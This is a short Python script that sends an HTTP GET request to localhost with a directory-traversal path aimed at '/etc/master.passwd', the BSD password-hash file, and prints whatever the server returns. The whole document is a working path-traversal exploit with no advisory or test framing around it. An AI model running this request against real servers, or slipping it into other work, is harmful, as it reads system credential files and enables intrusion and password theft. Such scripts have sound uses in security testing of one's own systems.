import http.client

conn = http.client.HTTPConnection("localhost")
payload = ''
headers = {}
conn.request("GET", "/../../../../etc/master.passwd", payload, headers)
res = conn.getresponse()
data = res.read()
print(data.decode("utf-8"))
